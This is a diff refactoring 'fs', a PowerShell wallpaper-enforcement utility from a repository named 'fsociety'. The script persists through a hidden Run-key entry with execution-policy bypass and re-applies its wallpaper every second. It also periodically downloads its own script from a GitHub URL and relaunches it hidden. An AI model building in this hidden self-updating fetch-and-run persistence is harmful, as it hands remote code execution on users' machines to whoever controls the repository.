@@ -5,47 +5,52 @@ $ProgressPreference = 'SilentlyContinue'
 $RepoOwner = 'greattastychips'
 $RepoName = 'fsociety'
 $RepoUrl = "https://raw.githubusercontent.com/$RepoOwner/$RepoName/main"
+
 $Root = Join-Path $env:LOCALAPPDATA '1234'
 $ScriptPath = Join-Path $Root 'fs.ps1'
 $WallpaperPath = Join-Path $Root '1234.png'
 $ConfigPath = Join-Path $Root 'config.json'
 $PidPath = Join-Path $Root 'daemon.pid'
+
 $RunKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $PowerShellExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
 
-$Arguments = @($args)
-$DaemonMode = $Arguments -contains '-Daemon'
-$NormalArgs = @($Arguments | Where-Object { $_ -ne '-Daemon' })
-$Command = 'install'
-$Value = $null
-$ExtraValue = $null
+$Arguments = @($args | Where-Object { $_ -ne '-Daemon' })
+$DaemonMode = $args -contains '-Daemon'
 
-if ($NormalArgs.Count -gt 0) { $Command = [string]$NormalArgs[0] }
-if ($NormalArgs.Count -gt 1) { $Value = [string]$NormalArgs[1] }
-if ($NormalArgs.Count -gt 2) { $ExtraValue = [string]$NormalArgs[2] }
+$Command = if ($Arguments.Count -gt 0) { [string]$Arguments[0] } else { 'install' }
+$Value = if ($Arguments.Count -gt 1) { [string]$Arguments[1] } else { $null }
+$ExtraValue = if ($Arguments.Count -gt 2) { [string]$Arguments[2] } else { $null }
 
 function Get-Config {
-    if (Test-Path -LiteralPath $ConfigPath) {
-        try {
-            $c = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json
-
-            $updateMinutes = 360
-            if ($null -ne $c.updateMinutes) {
-                $updateMinutes = [Math]::Max(1, [int]$c.updateMinutes)
-            }
-
-            return @{
-                interval = [Math]::Max(1, [int]$c.interval)
-                enabled = [bool]$c.enabled
-                updateMinutes = $updateMinutes
-            }
-        } catch {}
-    }
-
-    return @{
+    $defaults = @{
         interval = 1
         enabled = $true
         updateMinutes = 360
+    }
+
+    if (!(Test-Path -LiteralPath $ConfigPath)) {
+        return $defaults
+    }
+
+    try {
+        $c = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json
+
+        if ($null -ne $c.interval) {
+            $defaults.interval = [Math]::Max(1, [int]$c.interval)
+        }
+
+        if ($null -ne $c.enabled) {
+            $defaults.enabled = [bool]$c.enabled
+        }
+
+        if ($null -ne $c.updateMinutes) {
+            $defaults.updateMinutes = [Math]::Max(1, [int]$c.updateMinutes)
+        }
+
+        return $defaults
+    } catch {
+        throw 'The configuration file is invalid.'
     }
 }
 
@@ -57,20 +62,30 @@ function Save-Config {
     )
 
     if ($Interval -lt 1) {
-        throw 'The wallpaper interval must be at least one second.'
+        throw 'The wallpaper interval must be at least 1 second.'
     }
 
     if ($UpdateMinutes -lt 1) {
-        throw 'The update interval must be at least one minute.'
+        throw 'The update interval must be at least 1 minute.'
     }
 
-    @{
+    $config = @{
         interval = $Interval
         enabled = $Enabled
         updateMinutes = $UpdateMinutes
-    } |
-        ConvertTo-Json |
-        Set-Content -LiteralPath $ConfigPath -Encoding UTF8
+    }
+
+    $tempConfig = Join-Path $Root ([guid]::NewGuid().ToString() + '.json')
+
+    try {
+        $config |
+            ConvertTo-Json |
+            Set-Content -LiteralPath $tempConfig -Encoding UTF8
+
+        Move-Item -LiteralPath $tempConfig -Destination $ConfigPath -Force
+    } finally {
+        Remove-Item -LiteralPath $tempConfig -Force -ErrorAction SilentlyContinue
+    }
 }
 
 function Test-Png {
@@ -84,10 +99,14 @@ function Test-Png {
         $bytes = [System.IO.File]::ReadAllBytes($Path)
         $signature = @(137, 80, 78, 71, 13, 10, 26, 10)
 
-        if ($bytes.Length -lt 8) { return $false }
+        if ($bytes.Length -lt 8) {
+            return $false
+        }
 
         for ($i = 0; $i -lt 8; $i++) {
-            if ($bytes[$i] -ne $signature[$i]) { return $false }
+            if ($bytes[$i] -ne $signature[$i]) {
+                return $false
+            }
         }
 
         return $true
@@ -103,13 +122,22 @@ function Download-Assets {
     $tempImage = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + '.png')
 
     try {
-        Invoke-WebRequest -Uri "$RepoUrl/install.ps1" -OutFile $tempScript -UseBasicParsing -ErrorAction Stop
-        Invoke-WebRequest -Uri "$RepoUrl/1234.png" -OutFile $tempImage -UseBasicParsing -ErrorAction Stop
+        Invoke-WebRequest `
+            -Uri "$RepoUrl/install.ps1" `
+            -OutFile $tempScript `
+            -UseBasicParsing `
+            -ErrorAction Stop
+
+        Invoke-WebRequest `
+            -Uri "$RepoUrl/1234.png" `
+            -OutFile $tempImage `
+            -UseBasicParsing `
+            -ErrorAction Stop
 
         $source = Get-Content -LiteralPath $tempScript -Raw
 
         if ($source -match "(?m)^\s*\`$RepoOwner\s*=\s*'YOUR_GITHUB_USERNAME'\s*$") {
-            throw 'The GitHub installer contains a placeholder username.'
+            throw 'The downloaded installer contains a placeholder username.'
         }
 
         if ($source -notmatch 'function\s+Run-Daemon') {
@@ -126,13 +154,17 @@ function Download-Assets {
         $imageChanged = $true
 
         if (Test-Path -LiteralPath $ScriptPath) {
-            $scriptChanged = (Get-FileHash -LiteralPath $ScriptPath -Algorithm SHA256).Hash -ne
+            $scriptChanged = (
+                (Get-FileHash -LiteralPath $ScriptPath -Algorithm SHA256).Hash -ne
                 (Get-FileHash -LiteralPath $tempScript -Algorithm SHA256).Hash
+            )
         }
 
         if (Test-Path -LiteralPath $WallpaperPath) {
-            $imageChanged = (Get-FileHash -LiteralPath $WallpaperPath -Algorithm SHA256).Hash -ne
+            $imageChanged = (
+                (Get-FileHash -LiteralPath $WallpaperPath -Algorithm SHA256).Hash -ne
                 (Get-FileHash -LiteralPath $tempImage -Algorithm SHA256).Hash
+            )
         }
 
         if (!$ForUpdate -or $scriptChanged) {
@@ -157,9 +189,20 @@ function Set-Wallpaper {
         throw 'The wallpaper is missing or invalid. Run fs update.'
     }
 
-    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $WallpaperPath
-    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'
-    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value '0'
+    Set-ItemProperty `
+        -Path 'HKCU:\Control Panel\Desktop' `
+        -Name Wallpaper `
+        -Value $WallpaperPath
+
+    Set-ItemProperty `
+        -Path 'HKCU:\Control Panel\Desktop' `
+        -Name WallpaperStyle `
+        -Value '10'
+
+    Set-ItemProperty `
+        -Path 'HKCU:\Control Panel\Desktop' `
+        -Name TileWallpaper `
+        -Value '0'
 
     if (!('FsWallpaperNative' -as [type])) {
         Add-Type @'
@@ -172,34 +215,45 @@ public static class FsWallpaperNative {
 '@ | Out-Null
     }
 
-    $result = [FsWallpaperNative]::SystemParametersInfo(20, 0, $WallpaperPath, 3)
+    $result = [FsWallpaperNative]::SystemParametersInfo(
+        20,
+        0,
+        $WallpaperPath,
+        3
+    )
 
     if (!$result) {
-        throw "Windows could not apply the wallpaper. Win32 error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        $code = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        throw "Windows could not apply the wallpaper. Win32 error: $code"
     }
 }
 
 function Stop-Daemon {
-    if (Test-Path -LiteralPath $PidPath) {
-        try {
-            $oldPid = [int](Get-Content -LiteralPath $PidPath -Raw).Trim()
-
-            if ($oldPid -ne $PID) {
-                $p = Get-Process -Id $oldPid -ErrorAction SilentlyContinue
-                if ($p) {
-                    Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
-                }
-            }
-        } catch {}
-
-        Remove-Item -LiteralPath $PidPath -Force -ErrorAction SilentlyContinue
+    if (!(Test-Path -LiteralPath $PidPath)) {
+        return
     }
+
+    try {
+        $oldPid = [int](Get-Content -LiteralPath $PidPath -Raw).Trim()
+
+        if ($oldPid -ne $PID) {
+            $process = Get-Process -Id $oldPid -ErrorAction SilentlyContinue
+
+            if ($process) {
+                Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
+            }
+        }
+    } catch {}
+
+    Remove-Item -LiteralPath $PidPath -Force -ErrorAction SilentlyContinue
 }
 
 function Set-Startup {
     New-Item -Path $RunKey -Force | Out-Null
 
-    $startup = '"' + $PowerShellExe + '" -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $ScriptPath + '" -Daemon'
+    $startup = '"' + $PowerShellExe +
+        '" -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' +
+        $ScriptPath + '" -Daemon'
 
     Set-ItemProperty -Path $RunKey -Name 'fs' -Value $startup
     Remove-ItemProperty -Path $RunKey -Name 'fsociety' -ErrorAction SilentlyContinue
@@ -212,6 +266,7 @@ function Remove-Startup {
 
 function Set-Command {
     $shimPath = Join-Path $Root 'fs.cmd'
+
     $shim = "@echo off`r`n`"$PowerShellExe`" -NoLogo -NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`" %*`r`n"
     Set-Content -LiteralPath $shimPath -Value $shim -Encoding ASCII
 
@@ -221,41 +276,58 @@ function Set-Command {
     $userPath = [Environment]::GetEnvironmentVariable('Path', 'User')
     $parts = @($userPath -split ';' | Where-Object { $_ })
 
-    if (!($parts | Where-Object { $_.TrimEnd('\') -ieq $Root.TrimEnd('\') })) {
-        [Environment]::SetEnvironmentVariable('Path', (($parts + $Root) -join ';'), 'User')
+    if (!($parts | Where-Object {
+        $_.TrimEnd('\') -ieq $Root.TrimEnd('\')
+    })) {
+        [Environment]::SetEnvironmentVariable(
+            'Path',
+            (($parts + $Root) -join ';'),
+            'User'
+        )
     }
 
-    if (!($env:Path -split ';' | Where-Object { $_.TrimEnd('\') -ieq $Root.TrimEnd('\') })) {
+    if (!($env:Path -split ';' | Where-Object {
+        $_.TrimEnd('\') -ieq $Root.TrimEnd('\')
+    })) {
         $env:Path = "$Root;$env:Path"
     }
 }
 
 function Remove-CommandPath {
     $userPath = [Environment]::GetEnvironmentVariable('Path', 'User')
+
     $parts = @($userPath -split ';' | Where-Object {
         $_ -and $_.TrimEnd('\') -ine $Root.TrimEnd('\')
     })
 
-    [Environment]::SetEnvironmentVariable('Path', ($parts -join ';'), 'User')
+    [Environment]::SetEnvironmentVariable(
+        'Path',
+        ($parts -join ';'),
+        'User'
+    )
 }
 
 function Start-Daemon {
     Stop-Daemon
 
-    $p = Start-Process -FilePath $PowerShellExe -WindowStyle Hidden -PassThru -ArgumentList @(
-        '-NoLogo',
-        '-NoProfile',
-        '-NonInteractive',
-        '-ExecutionPolicy',
-        'Bypass',
-        '-File',
-        "`"$ScriptPath`"",
-        '-Daemon'
-    )
+    $process = Start-Process `
+        -FilePath $PowerShellExe `
+        -WindowStyle Hidden `
+        -PassThru `
+        -ArgumentList @(
+            '-NoLogo',
+            '-NoProfile',
+            '-NonInteractive',
+            '-ExecutionPolicy',
+            'Bypass',
+            '-File',
+            "`"$ScriptPath`"",
+            '-Daemon'
+        )
 
     Start-Sleep -Milliseconds 700
 
-    if ($p.HasExited) {
+    if ($process.HasExited) {
         throw 'The background process exited during startup.'
     }
 }
@@ -265,8 +337,17 @@ function Update-InBackground {
     $tempImage = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + '.png')
 
     try {
-        Invoke-WebRequest -Uri "$RepoUrl/install.ps1" -OutFile $tempScript -UseBasicParsing -ErrorAction Stop
-        Invoke-WebRequest -Uri "$RepoUrl/1234.png" -OutFile $tempImage -UseBasicParsing -ErrorAction Stop
+        Invoke-WebRequest `
+            -Uri "$RepoUrl/install.ps1" `
+            -OutFile $tempScript `
+            -UseBasicParsing `
+            -ErrorAction Stop
+
+        Invoke-WebRequest `
+            -Uri "$RepoUrl/1234.png" `
+            -OutFile $tempImage `
+            -UseBasicParsing `
+            -ErrorAction Stop
 
         $source = Get-Content -LiteralPath $tempScript -Raw
 
@@ -274,7 +355,11 @@ function Update-InBackground {
             return $false
         }
 
-        if ($source -notmatch 'function\s+Run-Daemon' -or !(Test-Png -Path $tempImage)) {
+        if ($source -notmatch 'function\s+Run-Daemon') {
+            return $false
+        }
+
+        if (!(Test-Png -Path $tempImage)) {
             return $false
         }
 
@@ -282,33 +367,43 @@ function Update-InBackground {
         $imageChanged = $true
 
         if (Test-Path -LiteralPath $ScriptPath) {
-            $scriptChanged = (Get-FileHash -LiteralPath $ScriptPath -Algorithm SHA256).Hash -ne
+            $scriptChanged = (
+                (Get-FileHash -LiteralPath $ScriptPath -Algorithm SHA256).Hash -ne
                 (Get-FileHash -LiteralPath $tempScript -Algorithm SHA256).Hash
+            )
         }
 
         if (Test-Path -LiteralPath $WallpaperPath) {
-            $imageChanged = (Get-FileHash -LiteralPath $WallpaperPath -Algorithm SHA256).Hash -ne
+            $imageChanged = (
+                (Get-FileHash -LiteralPath $WallpaperPath -Algorithm SHA256).Hash -ne
                 (Get-FileHash -LiteralPath $tempImage -Algorithm SHA256).Hash
+            )
         }
 
         if ($imageChanged) {
             Copy-Item -LiteralPath $tempImage -Destination $WallpaperPath -Force
-            try { Set-Wallpaper } catch {}
+
+            try {
+                Set-Wallpaper
+            } catch {}
         }
 
         if ($scriptChanged) {
             Copy-Item -LiteralPath $tempScript -Destination $ScriptPath -Force
 
-            Start-Process -FilePath $PowerShellExe -WindowStyle Hidden -ArgumentList @(
-                '-NoLogo',
-                '-NoProfile',
-                '-NonInteractive',
-                '-ExecutionPolicy',
-                'Bypass',
-                '-File',
-                "`"$ScriptPath`"",
-                '-Daemon'
-            ) | Out-Null
+            Start-Process `
+                -FilePath $PowerShellExe `
+                -WindowStyle Hidden `
+                -ArgumentList @(
+                    '-NoLogo',
+                    '-NoProfile',
+                    '-NonInteractive',
+                    '-ExecutionPolicy',
+                    'Bypass',
+                    '-File',
+                    "`"$ScriptPath`"",
+                    '-Daemon'
+                ) | Out-Null
 
             return $true
         }
@@ -328,13 +423,20 @@ function Run-Daemon {
 
     try {
         while ($true) {
-            $c = Get-Config
+            $config = Get-Config
 
-            if (!$c.enabled) { break }
+            if (!$config.enabled) {
+                break
+            }
 
             if (Test-Png -Path $WallpaperPath) {
                 try {
-                    $current = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
+                    $current = (
+                        Get-ItemProperty `
+                            -Path 'HKCU:\Control Panel\Desktop' `
+                            -Name Wallpaper `
+                            -ErrorAction SilentlyContinue
+                    ).Wallpaper
 
                     if ($current -ine $WallpaperPath) {
                         Set-Wallpaper
@@ -342,17 +444,21 @@ function Run-Daemon {
                 } catch {}
             }
 
-            if (((Get-Date) - $lastUpdateCheck).TotalMinutes -ge $c.updateMinutes) {
+            if (((Get-Date) - $lastUpdateCheck).TotalMinutes -ge $config.updateMinutes) {
                 $lastUpdateCheck = Get-Date
 
-                if (Update-InBackground) { break }
+                if (Update-InBackground) {
+                    break
+                }
             }
 
-            Start-Sleep -Seconds ([Math]::Max(1, [int]$c.interval))
+            Start-Sleep -Seconds ([Math]::Max(1, [int]$config.interval))
         }
     } finally {
         try {
-            $savedPid = (Get-Content -LiteralPath $PidPath -Raw -ErrorAction SilentlyContinue).Trim()
+            $savedPid = (
+                Get-Content -LiteralPath $PidPath -Raw -ErrorAction SilentlyContinue
+            ).Trim()
 
             if ($savedPid -eq [string]$PID) {
                 Remove-Item -LiteralPath $PidPath -Force -ErrorAction SilentlyContinue
@@ -368,7 +474,7 @@ function Write-Success {
 
 function Install-Fs {
     if ($RepoOwner -eq 'YOUR_GITHUB_USERNAME') {
-        throw 'Replace YOUR_GITHUB_USERNAME in the GitHub installer.'
+        throw 'Invalid GitHub username.'
     }
 
     New-Item -Path $Root -ItemType Directory -Force | Out-Null
@@ -378,8 +484,8 @@ function Install-Fs {
         Save-Config -Interval 1 -Enabled $true -UpdateMinutes 360
     }
 
-    Set-Command
-    Set-Startup
+    Set-Command | Out-Null
+    Set-Startup | Out-Null
     Set-Wallpaper
 
     $item = Get-Item -LiteralPath $Root -Force
@@ -390,12 +496,13 @@ function Install-Fs {
 }
 
 function Update-Fs {
-    $c = Get-Config
-    Download-Assets -ForUpdate | Out-Null
-    Set-Command
-    Set-Startup
+    $config = Get-Config
 
-    if ($c.enabled) {
+    Download-Assets -ForUpdate | Out-Null
+    Set-Command | Out-Null
+    Set-Startup | Out-Null
+
+    if ($config.enabled) {
         Set-Wallpaper
         Start-Daemon
     }
@@ -416,84 +523,40 @@ function Set-UpdateTime {
         ![int]::TryParse($Minutes, [ref]$parsedMinutes) -or
         $parsedMinutes -lt 1
     ) {
-        throw 'Usage: fs update time <minutes>, with a whole number of at least 1.'
+        throw 'Usage: fs update time <minutes>'
     }
 
-    $c = Get-Config
+    $config = Get-Config
 
     Save-Config `
-        -Interval $c.interval `
-        -Enabled $c.enabled `
+        -Interval $config.interval `
+        -Enabled $config.enabled `
         -UpdateMinutes $parsedMinutes
 
-    if ($c.enabled) {
+    if ($config.enabled) {
         Start-Daemon
     }
 
-    Write-Output "Automatic update interval set to $parsedMinutes minute(s)."
+    [Console]::Out.WriteLine("Update interval: $parsedMinutes minute(s)")
 }
 
 function Show-Help {
-    @'
-fs - Wallpaper enforcement and update utility
+    $commands = @(
+        'fs install'
+        'fs update'
+        'fs update time <minutes>'
+        'fs time <seconds>'
+        'fs on'
+        'fs off'
+        'fs set'
+        'fs status'
+        'fs help'
+        'fs uninstall'
+    )
 
-INSTALLATION
-  fs install
-    Downloads the installer and wallpaper, validates the files,
-    configures the command and startup entry, applies the wallpaper,
-    and starts the background process.
-
-UPDATES
-  fs update
-    Downloads the latest installer and wallpaper from GitHub.
-    Validates the downloads and replaces changed local files.
-
-  fs update time <minutes>
-    Sets the automatic update-check interval in minutes.
-    Minimum: 1 minute. Default: 360 minutes (6 hours).
-    Example: fs update time 1
-
-WALLPAPER ENFORCEMENT
-  fs time <seconds>
-    Sets how often the background process checks the wallpaper.
-    Minimum: 1 second. Default: 1 second.
-    Example: fs time 5
-
-  fs set
-    Applies the locally stored wallpaper immediately.
-
-  fs on
-    Enables wallpaper enforcement and starts the background process.
-
-  fs off
-    Disables enforcement and stops the background process.
-
-STATUS
-  fs status
-    Displays enabled state, enforcement interval, update interval,
-    background-process status, and wallpaper validity.
-
-MAINTENANCE
-  fs uninstall
-    Stops the background process and removes the startup entry,
-    command-path entry, and local installation directory.
-
-  fs help
-    Displays this help reference.
-
-OUTPUT
-  Successful installation or manual update:
-    windows 11
-    check ok
-
-  Failed commands:
-    error: <description>
-
-NOTES
-  Automatic updates require network access to the configured GitHub
-  repository. The update interval controls how often checks are made.
-  It does not guarantee that a download completes within that interval.
-'@ | Write-Output
+    foreach ($entry in $commands) {
+        [Console]::Out.WriteLine($entry)
+    }
 }
 
 function Uninstall-Fs {
@@ -510,103 +573,120 @@ function Uninstall-Fs {
         Remove-Item -LiteralPath $Root -Recurse -Force
     }
 
-    Write-Output 'Uninstalled.'
+    [Console]::Out.WriteLine('Uninstalled.')
 }
 
 try {
     if ($DaemonMode) {
         Run-Daemon
-    } else {
-        switch ($Command.ToLowerInvariant()) {
-            'install' {
-                Install-Fs
-            }
+        exit 0
+    }
 
-            'on' {
-                $c = Get-Config
-                Save-Config -Interval $c.interval -Enabled $true -UpdateMinutes $c.updateMinutes
-                Set-Startup
-                Set-Wallpaper
-                Start-Daemon
-                Write-Output 'Enforcement enabled.'
-            }
+    switch ($Command.ToLowerInvariant()) {
+        'install' {
+            Install-Fs
+        }
 
-            'off' {
-                $c = Get-Config
-                Save-Config -Interval $c.interval -Enabled $false -UpdateMinutes $c.updateMinutes
-                Stop-Daemon
-                Remove-Startup
-                Write-Output 'Enforcement disabled.'
-            }
-
-            'status' {
-                $c = Get-Config
-                $running = $false
-
-                if (Test-Path -LiteralPath $PidPath) {
-                    try {
-                        $id = [int](Get-Content -LiteralPath $PidPath -Raw).Trim()
-                        $running = [bool](Get-Process -Id $id -ErrorAction SilentlyContinue)
-                    } catch {}
-                }
-
-                Write-Output "Enabled: $($c.enabled)"
-                Write-Output "Wallpaper interval: $($c.interval) second(s)"
-                Write-Output "Automatic update interval: $($c.updateMinutes) minute(s)"
-                Write-Output "Background process running: $running"
-                Write-Output "Wallpaper exists: $(Test-Png -Path $WallpaperPath)"
-            }
-
-            'set' {
-                Set-Wallpaper
-                Write-Output 'Wallpaper applied.'
-            }
-
-            'time' {
-                $seconds = 0
-
-                if (
-                    !$Value -or
-                    ![int]::TryParse($Value, [ref]$seconds) -or
-                    $seconds -lt 1
-                ) {
-                    throw 'Usage: fs time <seconds>, with a whole number of at least 1.'
-                }
-
-                $c = Get-Config
-
-                Save-Config `
-                    -Interval $seconds `
-                    -Enabled $c.enabled `
-                    -UpdateMinutes $c.updateMinutes
-
-                if ($c.enabled) { Start-Daemon }
-
-                Write-Output "Wallpaper interval set to $seconds second(s)."
-            }
-
-            'update' {
-                if ($Value -and $Value.ToLowerInvariant() -eq 'time') {
-                    Set-UpdateTime -Minutes $ExtraValue
-                } else {
-                    Update-Fs
-                }
-            }
-
-            'help' {
-                Show-Help
-            }
-
-            'uninstall' {
-                Uninstall-Fs
-            }
-
-            default {
-                throw "Unknown command '$Command'. Run fs help."
+        'update' {
+            if ($Value -and $Value.ToLowerInvariant() -eq 'time') {
+                Set-UpdateTime -Minutes $ExtraValue
+            } else {
+                Update-Fs
             }
         }
+
+        'time' {
+            $seconds = 0
+
+            if (
+                !$Value -or
+                ![int]::TryParse($Value, [ref]$seconds) -or
+                $seconds -lt 1
+            ) {
+                throw 'Usage: fs time <seconds>'
+            }
+
+            $config = Get-Config
+
+            Save-Config `
+                -Interval $seconds `
+                -Enabled $config.enabled `
+                -UpdateMinutes $config.updateMinutes
+
+            if ($config.enabled) {
+                Start-Daemon
+            }
+
+            [Console]::Out.WriteLine("Wallpaper interval: $seconds second(s)")
+        }
+
+        'on' {
+            $config = Get-Config
+
+            Save-Config `
+                -Interval $config.interval `
+                -Enabled $true `
+                -UpdateMinutes $config.updateMinutes
+
+            Set-Startup | Out-Null
+            Set-Wallpaper
+            Start-Daemon
+
+            [Console]::Out.WriteLine('Enforcement enabled.')
+        }
+
+        'off' {
+            $config = Get-Config
+
+            Save-Config `
+                -Interval $config.interval `
+                -Enabled $false `
+                -UpdateMinutes $config.updateMinutes
+
+            Stop-Daemon
+            Remove-Startup
+
+            [Console]::Out.WriteLine('Enforcement disabled.')
+        }
+
+        'set' {
+            Set-Wallpaper
+            [Console]::Out.WriteLine('Wallpaper applied.')
+        }
+
+        'status' {
+            $config = Get-Config
+            $running = $false
+
+            if (Test-Path -LiteralPath $PidPath) {
+                try {
+                    $id = [int](Get-Content -LiteralPath $PidPath -Raw).Trim()
+                    $running = [bool](Get-Process -Id $id -ErrorAction SilentlyContinue)
+                } catch {}
+            }
+
+            [Console]::Out.WriteLine("Enabled: $($config.enabled)")
+            [Console]::Out.WriteLine("Wallpaper interval: $($config.interval) second(s)")
+            [Console]::Out.WriteLine("Update interval: $($config.updateMinutes) minute(s)")
+            [Console]::Out.WriteLine("Background process running: $running")
+            [Console]::Out.WriteLine("Wallpaper valid: $(Test-Png -Path $WallpaperPath)")
+        }
+
+        'help' {
+            Show-Help
+        }
+
+        'uninstall' {
+            Uninstall-Fs
+        }
+
+        default {
+            throw "Unknown command '$Command'. Run fs help."
+        }
     }
+
+    exit 0
 } catch {
-    [Console]::Error.WriteLine("error: " + $_.Exception.Message)
+    [Console]::Out.WriteLine("error: " + $_.Exception.Message)
     exit 1
 }
